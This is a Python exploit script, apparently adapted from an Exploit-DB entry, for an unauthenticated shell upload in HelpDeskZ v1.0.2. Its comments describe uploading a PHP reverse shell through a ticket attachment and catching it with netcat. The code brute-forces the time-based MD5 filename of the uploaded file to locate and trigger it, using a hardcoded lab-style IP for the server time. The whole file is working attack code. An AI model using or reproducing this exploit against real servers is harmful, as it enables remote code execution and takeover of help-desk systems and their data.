#!/bin/python
#This is a modified version of https://www.exploit-db.com/raw/40300
#Since the sysntax on time calculation is incorect
'''
The default configuration of this software allows for php files  to be uploaded

Steps to reproduce

Fill out a ticket form and attach a php file, solve the captcha and upload,
(the application will display 'File is not allowed' but the file is still uploaded!!

Set up a netcat session to catch the reverse shell

Run this script and receave a reverse shell back!!!

'''
import hashlib
import time, calendar
import sys
import requests

print 'HelpDesk v1.0.2 - Unauthenticated shell upload'

if len(sys.argv) < 3:
    print "Usage: {} http://helpdeskz.com/support/uploads/tickets/ Reverse-shell.php".format(sys.argv[0])
    sys.exit(1)


helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

#Getting the Time from the server
response = requests.head('http://10.10.10.121/support/')
serverTime = response.headers['Date']
#setting the time in Epoch
FormatTime = '%a, %d %b %Y %H:%M:%S %Z'
currentTime = int(calendar.timegm(time.strptime(serverTime, FormatTime)))


for x in range(0,300):
    plaintext = fileName + str(currentTime -x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl + md5hash + '.php'
    response = requests.head(url)
    if response.status_code == 200:
        print("found!")
        print(url)
        sys.exit(0)

print("Sorry, I did not find anything")

